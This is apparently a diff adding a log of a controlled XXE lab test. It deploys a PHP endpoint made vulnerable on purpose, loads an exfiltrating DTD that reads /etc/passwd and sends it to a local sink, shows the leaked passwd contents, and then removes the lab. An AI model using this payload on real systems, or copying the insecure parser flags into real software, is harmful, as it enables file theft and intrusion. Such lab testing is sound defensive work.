@@ -1,0 +1,21 @@
+﻿--- A_parser_matrix: {"simplexml_internal_entity": "a=INT-CANARY-7788", "simplexml_SYSTEM_no_flag": "len=0 a=", "simplexml_SYSTEM_LIBXML_NOENT": "len=3256 a=root:x:0:0:root:/ro", "DOMDocument_SYSTEM_no_flag": "len=0", "DOMDocument_SYSTEM_NOENT_DTDLOAD": "len=6512 a=root:x:0:0:root:/ro", "DOMDocument_SYSTEM_NOENT_NONET": "len=6512 a=root:x:0:0:root:/ro"}
+--- sink_up: {"port": 8099, "bind": "127.0.0.1", "log": "/tmp/loop3-t4-probe11-sink.jsonl"}
+--- B_deploy_cmd: {"cmd": "cp /tmp/lo3_noent.php /var/www/html/lo3-teach/noent.php; cp /tmp/lo3_noflag.php /var/www/html/lo3-teach/noflag.php; cp /tmp/lo3_evil.dtd /var/www/html/lo3-teach/evil.dtd"}
+--- B_deploy_result: {"v": "total 20\ndrwxr-xr-x 2 www-data www-data 4096 Oct 12 10:07 .\ndrwxr-xr-x 5 root     root     4096 Oct 12 10:07 ..\n-rw-r--r-- 1 root     root      143 Oct 12 10:07 evil.dtd\n-rw-r--r-- 1 root     root      590 Oct 12 10:07 noent.php\n-rw-r--r-- 1 root     root      339 Oct 12 10:07 noflag.php"}
+--- B_dtd_source: {"path": "/var/www/html/lo3-teach/evil.dtd", "content": "<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; err SYSTEM 'http://127.0.0.1:8099/LO3DTD-%file;'>\">\n%eval;\n%err;\n"}
+--- B_endpoint_source_noent: {"path": "/var/www/html/lo3-teach/noent.php", "content": "<?php\n// ===== loop3 t4 B2 自建教学靶点（SELF-BUILT / TEACHING ONLY）=====\n// 用途：受控 XXE 验证（本地 DTD 回显 + file:// 读取 + 对照）\n// 部署：由 security/learning/_evidence/loop3-t4-probe11.py 写入 /var/www/html/lo3-teach\n// 删除：sudo -n rm -rf /var/www/html/lo3-teach\n$body = file_get_contents(\"php://input\");\nif ($body === \"\") { http_response_code(400); echo \"no body\"; exit; }\n$doc = new DOMDocument();\n$ok = $doc->loadXML($body, LIBXML_NOENT | LIBXML_DTDLOAD);   // ← 故意打开外部实体\necho \"LO3_TEACH_NOENT=1\\n\";\necho $doc->textContent;\n"}
+--- B_endpoint_source_noflag: {"path": "/var/www/html/lo3-teach/noflag.php", "content": "<?php\n// ===== loop3 t4 B2 自建教学靶点（对照端点：不传 LIBXML_NOENT）=====\n$body = file_get_contents(\"php://input\");\nif ($body === \"\") { http_response_code(400); echo \"no body\"; exit; }\n$doc = new DOMDocument();\n$ok = $doc->loadXML($body);   // ← 未开启外部实体\necho \"LO3_TEACH_NOENT=0\\n\";\necho $doc->textContent;\n"}
+--- B1_internal_entity_echo: {"url": "http://127.0.0.1/lo3-teach/noent.php", "status": 200, "resp": "LO3_TEACH_NOENT=1 LO3-INTERNAL-CANARY-9911LO3-INTERNAL-CANARY-9911", "oob_new": 0, "oob_paths": []}
+--- B2_file_entity_passwd_NOENT: {"url": "http://127.0.0.1/lo3-teach/noent.php", "status": 200, "resp": "LO3_TEACH_NOENT=1 root:x:0:0:root:/root:/usr/bin/zsh daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/no", "oob_new": 0, "oob_paths": []}
+--- B3_file_entity_passwd_NOFLAG_control: {"url": "http://127.0.0.1/lo3-teach/noflag.php", "status": 200, "resp": "LO3_TEACH_NOENT=0 ", "oob_new": 0, "oob_paths": []}
+--- B4_internal_entity_NOFLAG_control: {"url": "http://127.0.0.1/lo3-teach/noflag.php", "status": 200, "resp": "LO3_TEACH_NOENT=0 LO3-INTERNAL-CANARY-9911LO3-INTERNAL-CANARY-9911", "oob_new": 0, "oob_paths": []}
+--- B5_local_file_dtd_load: {"url": "http://127.0.0.1/lo3-teach/noent.php", "status": 200, "resp": "LO3_TEACH_NOENT=1 x", "oob_new": 0, "oob_paths": []}
+SINK_HIT {"at": "2026-10-12T10:07:21.475503", "method": "GET", "path": "/lo3dtd-remote.dtd", "headers": {"Host": "127.0.0.1:8099", "Connection": "close"}, "body": ""}
+--- B6_remote_dtd_oob: {"url": "http://127.0.0.1/lo3-teach/noent.php", "status": 200, "resp": "LO3_TEACH_NOENT=1 ", "oob_new": 1, "oob_paths": ["/lo3dtd-remote.dtd"]}
+--- C_remove_cmd: {"cmd": "sudo -n rm -rf /var/www/html/lo3-teach"}
+--- C_remove_result: {"v": "0\n0 (removed)"}
+--- C_verify_removed: {"http_status": 404}
+--- C_docroot: {"v": "total 40\ndrwxr-xr-x  4 root     root      4096 Oct 12 10:07 .\ndrwxr-xr-x  3 root     root      4096 Jun 16 10:26 ..\ndrwxr-xr-x 12 root     root     12288 Oct 11 00:01 bWAPP\ndrwxr-xr-x 12 www-data www-data  4096 Oct  8 19:29 dvwa\n-rw-r--r--  1 root     root     10703 Jun 16 10:30 index.html\n-rw-r--r--  1 root     root       896 Jun 16 10:28 index.nginx-debian.html"}
+{"rc": "ok", "sink_hits": 1}
+{"rc": 0, "stdout_len": 4303, "stderr_len": 0}
+
